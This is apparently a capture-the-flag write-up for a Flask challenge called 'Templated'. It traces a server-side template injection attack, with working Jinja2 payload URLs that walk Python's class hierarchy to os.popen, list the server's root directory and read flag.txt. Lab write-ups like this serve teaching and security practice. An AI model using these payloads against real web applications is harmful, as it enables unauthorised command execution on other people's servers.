# Templated

## Set up
Start challenge and browse to given address

## Explore the site
- There doesn't seem to be a lot going on here
- Try using burpsuite to inspect requests and responses and don't get much
- Try using a random resource at the end of the url and we get the extension echoed back

```
http://159.65.85.171:32767/asdf

Error 404

The page 'asdf' could not be found
```
- Flask uses a templating engine called jinja2, can execute python using {{ }}
- Try using {{7+7}} in the url

```
http://159.65.85.171:32767/%7B%7B7+7%7D%7D

The page '14' could not be found
```


## SSTI
```
http://159.65.85.171:32767/{{config}}

The page '<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>' could not be found
```
- Doesn't seem to be anything useful in the flask config
- It seems like the general approach for these types of problems is to find a way to import the os module and leveraging that to execute the system commands
- This page is great at shedding light on how this thing works
	- https://secure-cookie.io/attacks/ssti/

- Blindly using their string didn't work, time to explore why
```
http://159.65.85.171:32767/%7B%7B%22foo%22.__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen(%22ls%22).read()%7D%7D
```

## Local python interpreter research
- This is such a clever technique
- It seems like they are starting with the python string class and using private attributes attached to it to navigate there way to a class that imports the sys module
	- The sys module can then be used to import the os module and then using popen can run anything on the host os
	- That's pretty wild
- The subclass they use (182) correlates to "warnings.catch_warnings" class
	- from the list I created below for my local python interpreter that doesn't line up, I'm going to assume this is happening on the target device
	- warnings.catch_warnings seems to be element number 144 in the __subclasses__() output
```
>>> for i, class_name in enumerate("foo".__class__.__base__.__subclasses__()):
...     print(i, class_name)
... 
0 <class 'type'>
1 <class 'async_generator'>
2 <class 'int'>
3 <class 'bytearray_iterator'>
4 <class 'bytearray'>
5 <class 'bytes_iterator'>
6 <class 'bytes'>
7 <class 'builtin_function_or_method'>

    ....

136 <class 'collections.abc.Callable'>
137 <class 'os._wrap_close'>
138 <class '_sitebuiltins.Quitter'>
139 <class '_sitebuiltins._Printer'>
140 <class '_sitebuiltins._Helper'>
141 <class 'types.DynamicClassAttribute'>
142 <class 'types._GeneratorWrapper'>
143 <class 'warnings.WarningMessage'>
144 <class 'warnings.catch_warnings'>
145 <class 'importlib._abc.Loader'>
146 <class 'itertools.accumulate'>
147 <class 'itertools.combinations'>
148 <class 'itertools.combinations_with_replacement'>
149 <class 'itertools.cycle'>
150 <class 'itertools.dropwhile'>
151 <class 'itertools.takewhile'>

    ...

186 <class 'contextlib._BaseExitStack'>
187 <class 'ast.AST'>
188 <class 'enum.auto'>
189 <enum 'Enum'>
190 <class 'ast.NodeVisitor'>
191 <class 'dis.Bytecode'>
192 <class 're.Pattern'>
193 <class 're.Match'>
194 <class '_sre.SRE_Scanner
241 <class 'dataclasses.InitVar'>
242 <class 'dataclasses.Field'>
243 <class 'dataclasses._DataclassParams'>
244 <class 'pprint._safe_key'>
245 <class 'pprint.PrettyPrinter'>
```

## This is turning into a text parsing exercise
- Now I'm sure there are many ways you can do this but I felt like using sed
- Firstly I used the following url to get the subclasses list from the target device
    - http://159.65.85.171:32767/%7B%7B%22foo%22.__class__.__base__.__subclasses__()%7D%7D
- then copied it into a local text file
```
$ cat subclasses_out | sed 's/,/\n/g' | wc -l
187
```
- Using 187 as our number gave zlib as the class, but getting the list of subclasses again it just seemed to be off by 1
```
http://159.65.85.171:32767/%7B%7B%22foo%22.__class__.__base__.__subclasses__()[187]%7D%7D

Error 404

The page '<class 'zlib.Compress'>' could not be found


http://159.65.85.171:32767/%7B%7B%22foo%22.__class__.__base__.__subclasses__()[186]%7D%7D

Error 404

The page '<class 'warnings.catch_warnings'>' could not be found
```
- Now that we have a reference to the sys module we can move onto exploiting 

## Exploitation
```
http://159.65.85.171:32767/%7B%7B%22foo%22.__class__.__base__.__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen(%22ls%22).read()%7D%7D

returns

Error 404

The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found
```
- This looks like the root directory of a linux based os
- Not sure why the flask app has set this as it's working directory, but notice we have a flag.txt here
- Simply changing the command being executed by popen gives us the flag
```
http://159.65.85.171:32767/%7B%7B%22foo%22.__class__.__base__.__subclasses__()[186].__init__.__globals__['sys'].modules['os'].popen(%22cat%20flag.txt%22).read()%7D%7D
```

